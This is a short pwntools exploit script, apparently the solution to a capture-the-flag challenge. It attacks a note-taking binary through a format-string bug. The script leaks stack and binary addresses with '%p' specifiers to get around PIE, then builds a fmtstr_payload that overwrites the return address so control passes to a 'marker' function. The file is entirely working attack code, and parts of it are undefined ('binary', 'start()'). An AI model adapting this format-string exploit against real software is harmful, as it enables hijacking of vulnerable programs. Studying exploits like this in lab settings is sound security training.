#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

exe = context.binary = ELF(binary)
io = start()
io = process(exe.path)

def write_note(idx, title, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", title)
    io.sendlineafter(b": ", content)

def read_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Title:\n")
    title = io.recvline()
    io.recvuntil(b"Content:\n")
    content = io.recvline()
    return title, content


#Calculating offset, leaking stack address and binary address
offset = 38
write_note(5, b"%6$p", b"%11$p")
leak_stack, leak_binary = read_note(5)

#Adress calculation
exe.address = int(leak_binary, 16) - exe.sym["main"] - 407
addr_marker = exe.sym["marker"]
print(hex(addr_marker))
ret_addr = int(leak_stack, 16) + 0x8

#Injecting string to call the function
write_note(1, b"a", fmtstr_payload(offset, {ret_addr : addr_marker}))
read_note(1)

io.wait_for_close()

exit(io.poll())

#Assuming PIE, so leaking also binary address, then calls marker (can be ROP)